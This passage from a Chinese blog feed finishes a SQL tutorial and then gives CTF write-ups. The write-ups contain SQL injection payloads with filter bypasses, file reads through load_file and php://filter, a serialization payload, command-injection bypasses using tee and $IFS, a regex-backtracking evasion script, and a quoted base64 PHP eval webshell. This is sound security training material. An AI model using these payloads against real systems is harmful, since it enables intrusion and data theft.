<code>user_id</code> 匹配。</li></ul><p>执行这个查询后，我们会得到以下结果：</p><table><thead><tr><th>id</th><th>name</th><th>order_id</th><th>user_id</th><th>product</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>101</td><td>1</td><td>Laptop</td></tr><tr><td>1</td><td>Alice</td><td>102</td><td>1</td><td>Mouse</td></tr><tr><td>2</td><td>Bob</td><td>103</td><td>2</td><td>Keyboard</td></tr><tr><td>3</td><td>Carol</td><td>104</td><td>3</td><td>Monitor</td></tr></tbody></table><h6 id="GROUP-BY的作用-用于结合聚合函数，根据一个或多个列对结果集进行分组"><a href="#GROUP-BY的作用-用于结合聚合函数，根据一个或多个列对结果集进行分组" class="headerlink" title="GROUP BY的作用 用于结合聚合函数，根据一个或多个列对结果集进行分组"></a><strong>GROUP BY的作用 用于结合聚合函数，根据一个或多个列对结果集进行分组</strong></h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name, aggregate_function(column_name)<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> column_name operator <span class="hljs-keyword">value</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> column_name;<br><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> column_name: 用于将结果集分组，以便对每个组应用聚合函数<br></code></pre></td></tr></table></figure><p>eg:</p><p>假设有一个名为 <code>Sales</code> 的表，结构如下：</p><table><thead><tr><th>product_id</th><th>sales_amount</th></tr></thead><tbody><tr><td>1</td><td>100</td></tr><tr><td>2</td><td>200</td></tr><tr><td>1</td><td>150</td></tr><tr><td>2</td><td>300</td></tr><tr><td>3</td><td>400</td></tr></tbody></table><p>如果你想计算每个产品的总销售额，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> product_id, <span class="hljs-built_in">SUM</span>(sales_amount)<br><span class="hljs-keyword">FROM</span> Sales<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> product_id;<br></code></pre></td></tr></table></figure><p>如果你想计算销售额大于 150 的产品的总销售额，可以这样写：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> product_id, <span class="hljs-built_in">SUM</span>(sales_amount)<br><span class="hljs-keyword">FROM</span> Sales<br><span class="hljs-keyword">WHERE</span> sales_amount <span class="hljs-operator">&gt;</span> <span class="hljs-number">150</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> product_id;<br></code></pre></td></tr></table></figure><p>对于第一个查询，结果将是：</p><table><thead><tr><th>product_id</th><th>SUM(sales_amount)</th></tr></thead><tbody><tr><td>1</td><td>250</td></tr><tr><td>2</td><td>500</td></tr><tr><td>3</td><td>400</td></tr></tbody></table><h6 id="HAVING的作用-可以让我们筛选分组后的各组数据。"><a href="#HAVING的作用-可以让我们筛选分组后的各组数据。" class="headerlink" title="HAVING的作用  可以让我们筛选分组后的各组数据。"></a>HAVING的作用  可以让我们筛选分组后的各组数据。</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>, aggregate_function(<span class="hljs-built_in">column_name</span>)<br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br><span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">operator</span> <span class="hljs-keyword">value</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">column_name</span><br><span class="hljs-keyword">HAVING</span> aggregate_function(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">operator</span> <span class="hljs-keyword">value</span>;<br><span class="hljs-keyword">HAVING</span> 子句用于对聚合后的结果进行过滤。只有满足该条件的分组才会出现在最终结果中。<br>这里的 aggregate_function(<span class="hljs-built_in">column_name</span>) 是你在 <span class="hljs-keyword">SELECT</span> 中使用的聚合函数，<span class="hljs-keyword">operator</span> 是同样的比较运算符，<span class="hljs-keyword">value</span> 是比较的值。<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>Sales</code> 的表，结构如下：</p><table><thead><tr><th>product_id</th><th>sales_amount</th></tr></thead><tbody><tr><td>1</td><td>100</td></tr><tr><td>2</td><td>200</td></tr><tr><td>1</td><td>150</td></tr><tr><td>2</td><td>300</td></tr><tr><td>3</td><td>400</td></tr></tbody></table><p>如果你想计算每个产品的总销售额，并仅返回总销售额大于 300 的产品，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> product_id, <span class="hljs-built_in">SUM</span>(sales_amount) <span class="hljs-keyword">AS</span> total_sales  <br><span class="hljs-built_in">SUM</span>(sales_amount) 计算每个产品的销售总额。<span class="hljs-keyword">AS</span> total_sales 将这个计算结果的列命名为 total_sales<br><span class="hljs-keyword">FROM</span> Sales<br><span class="hljs-keyword">WHERE</span> sales_amount <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> product_id<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">SUM</span>(sales_amount) <span class="hljs-operator">&gt;</span> <span class="hljs-number">300</span>;<br></code></pre></td></tr></table></figure><ol><li><strong>WHERE sales_amount &gt; 100</strong>:<ul><li>过滤掉销售额不大于 100 的记录。</li></ul></li><li><strong>GROUP BY product_id</strong>:<ul><li>按 <code>product_id</code> 进行分组。</li></ul></li><li><strong>SELECT product_id, SUM(sales_amount)</strong>:<ul><li>计算每个产品组的总销售额。</li></ul></li><li><strong>HAVING SUM(sales_amount) &gt; 300</strong>:<ul><li>在聚合结果中，只返回总销售额大于 300 的产品。</li></ul></li></ol><p>对于上述示例，结果可能如下：</p><table><thead><tr><th>product_id</th><th>total_sales</th></tr></thead><tbody><tr><td>2</td><td>500</td></tr><tr><td>3</td><td>400</td></tr></tbody></table><p><img src="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1732013665224.jpg" alt="1732013665224"></p><p>这个语句首先筛选出所有成绩大于等于80分的学生，并把他们的学号、姓名和性别插入到 STU 表中。<br>GROUP BY 和 HAVING 用来确保每个学生的每门课程成绩都大于等于80。</p><h5 id="（13）统计3门以上课程不及格的学生，把相应的学生姓名、系别追加到另外一个表中"><a href="#（13）统计3门以上课程不及格的学生，把相应的学生姓名、系别追加到另外一个表中" class="headerlink" title="（13）统计3门以上课程不及格的学生，把相应的学生姓名、系别追加到另外一个表中"></a>（13）统计3门以上课程不及格的学生，把相应的学生姓名、系别追加到另外一个表中</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> failed_students (SNAME, DEPARTMENT)<br><span class="hljs-keyword">SELECT</span> s.SNAME, s.DEPARTMENT<br><span class="hljs-keyword">FROM</span> student s<br><span class="hljs-keyword">JOIN</span> SC sc <span class="hljs-keyword">ON</span> s.SNO = sc.SNO<br><span class="hljs-keyword">WHERE</span> sc.grade &lt; <span class="hljs-number">60</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> s.SNO, s.SNAME, s.DEPARTMENT<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-keyword">DISTINCT</span> sc.CNO) &gt; <span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p>这个查询通过连接 student 表和 SC 表，筛选出不及格（成绩小于60）超过3门课程的学生，并将他们的姓名和系别插入到 failed_students 表中。</p>]]></content>
    
    
    
    <tags>
      
      <tag>基础知识 sql语句</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSS刷题记录</title>
    <link href="/2024/10/25/susu/"/>
    <url>/2024/10/25/susu/</url>
    
    <content type="html"><![CDATA[<h3 id="网鼎杯-2020青龙组-Notes"><a href="#网鼎杯-2020青龙组-Notes" class="headerlink" title="[网鼎杯 2020青龙组]Notes"></a>[网鼎杯 2020青龙组]Notes</h3><h3 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h3><h5 id="sql注入中load-file-函数的使用"><a href="#sql注入中load-file-函数的使用" class="headerlink" title="sql注入中load_file()函数的使用"></a>sql注入中load_file()函数的使用</h5><p><img src="/2024/10/25/susu/1.png" alt="图片"></p><p>前提: oad_file函数只有在满足两个条件的情况下才可以使用：</p><p>1、文件权限：chmod a+x pathtofile</p><p>2、文件大小：必须小于max_allowed_packet</p><p>3、必须指定文件完整的路径</p><p>通过robots协议下载后发现源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(load_file(<span class="hljs-string">&#x27;/var/www/html/flag.php&#x27;</span>)),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <br><br>load_file(<span class="hljs-string">&#x27;/var/www/html/flag.php&#x27;</span>)`: 这个函数用于从服务器文件系统读取文件的内容。在这个例子中，它尝试读取 `flag.php` 文件的内容。<br></code></pre></td></tr></table></figure><h3 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h3><p>注册用户之后发现sql注入，union select被过滤 用union&#x2F;**&#x2F;select</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> # 四个字段<br>库<br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <br>表<br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-comment">/*!SelEct*/</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-built_in">column_name</span>,<span class="hljs-string">&#x27;~&#x27;</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br>字段<br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br>数据<br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;fakebook&#x27;</span># <br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">根据源码构造序列化<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInfo</span>();<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-string">&#x27;admin888&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;age = <span class="hljs-number">12</span>;<br><span class="hljs-variable">$a</span>-&gt;blog = <span class="hljs-string">&#x27;file:///var/www/html/user.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;admin888&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">12</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/user.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="tee-exec"><a href="#tee-exec" class="headerlink" title="tee  exec()"></a>tee  <strong>exec()</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you see anything?&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><blockquote><p>|管道输出符  将前一个命令的输出传递给 <code>tee</code> 命令。</p><p>tee命令用于读取标准输入的数据，并将其内容输出成文件。</p><p>tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?url=l\s / |tee <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">/?url=tac /flllll\aaaaaaggggggg |tee 2.txt<br></code></pre></td></tr></table></figure><h2 id="正则匹配回溯绕过"><a href="#正则匹配回溯绕过" class="headerlink" title="正则匹配回溯绕过"></a><strong>正则匹配回溯绕过</strong></h2><p>这样匹配就实现了回溯，<strong>这里回溯有一个回溯限制次数——100 万次</strong></p><p> <strong>当回溯超出这个次数，还没吐完的字符串就可以逃逸匹配</strong></p><p>利用这个特性我们可以逃逸我们想要的语句，只要在我们的语句后加上100万个字符即可</p><p>等匹配超过这个次数时我们的语句自然就可以逃逸掉了</p><p>payload:</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> requests<br><span class="hljs-title">url</span> = &#x27;http://<span class="hljs-number">1.14</span>.<span class="hljs-number">71.254</span>:<span class="hljs-number">28288</span>/&#x27;<br><span class="hljs-title">payload</span> = &#x27;&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;?&gt;&lt;?=`sort /f*`?&gt;&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>:<span class="hljs-string">&quot;&#x27; + &quot;</span>-<span class="hljs-string">&quot; * 1000000 + &#x27;&quot;</span>&#125;&#x27;<br><span class="hljs-title">res</span> = requests.post(url=url, <span class="hljs-class"><span class="hljs-keyword">data</span>=&#123;&quot;<span class="hljs-title">letter</span>&quot;: <span class="hljs-title">payload</span>&#125;)</span><br><span class="hljs-title">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/2024/10/25/susu/2.png" alt="图片"></p><h1 id="NSSCTF-陇剑杯-2021-webshell-问-1-7"><a href="#NSSCTF-陇剑杯-2021-webshell-问-1-7" class="headerlink" title="NSSCTF[陇剑杯 2021]webshell 问(1~7)"></a>NSSCTF[陇剑杯 2021]webshell 问(1~7)</h1><p>查看登录系统使用的密码是_____________</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;password&quot;</span> 查看HTTP中有password的流量包<br></code></pre></td></tr></table></figure><p>(2)修改了一个日志文件，文件的绝对路径为_____________</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;.log&quot;</span>查看HTTP中有.<span class="hljs-built_in">log</span>的流量包.<br></code></pre></td></tr></table></figure><p>在流量包中发现data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;21_08_07.log 日志文件</p><p>后续流量包，其中存在命令执行pwd，查看http流，可以准确的得到网站目录为&#x2F;var&#x2F;www&#x2F;html </p><p>(3)http contains “whoami”查看http协议中包含whoami（查看当前用户的命令）的流量包</p><p>在317发现whoami但是在319有响应</p><p>(4)黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">上传webshell基本使用POST方法提交，然后再<span class="hljs-number">337</span>个包发现<span class="hljs-number">1</span><span class="hljs-selector-class">.php</span>经过分析确定为黑客写入的webshell<br>base <span class="hljs-number">64</span>编码了，其实搜索echo也可以<br>Value: <span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4=|base64 -d &gt; /var/www/html/1.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>(5)问五：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答： 黑客上传的代理工具客户端名字是_____________。</p><p>http contains “1.php”过滤http协议中包含的1.php，右击数据包查看http流，直接查看黑客进行的操作进行分析,通过分析发现345流量包对比341流量包回显的数据中多了一个frpc.ini文件，猜测该文件为黑客上传的代理工具</p><p><a href="https://blog.csdn.net/2301_76690905/article/details/135037053">https://blog.csdn.net/2301_76690905/article/details/135037053</a></p><h1 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h1><p>题目页面给了一条flag路径，先试着POST传参进去，使用php为协议，但是发现提示有waf，先看看index.php看看条件base64解码后得到php代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nssctf waf!&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    <br></code></pre></td></tr></table></figure><p>根据上面得到的代码，我们可以知道当读取的长度大于等于800时即可绕过WAF，因此构造payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag=800个字符&amp;flag=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h1><p>知识点:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">命令执行<br>linux空格绕过<br>反引号绕过       变量绕过          <span class="hljs-built_in">base64</span>编码绕过<br></code></pre></td></tr></table></figure><p>打开页面提示 “听说php可以执行系统函数？我来康康”</p><p>输入127.0.0.1</p><p>因为提示是命令执行,并且会执行ping操作,用;分隔命令,输入 </p><p>127.0.0.1;ls</p><p>发现回显了两个文件flag.php 和 index.php 也说明是linux环境,查看一下flag.php文件</p><p>输入127.0.0.1;cat flag.php 报错fxck your space!</p><p>说明是过滤了空格<br>#${IFS}  $IFS$1  %09  %20  ${IFS  &lt;重定向符号 有时候都可以替代空格 就看题目过滤了什么符号</p><p>尝试之后发现$IFS$1可以  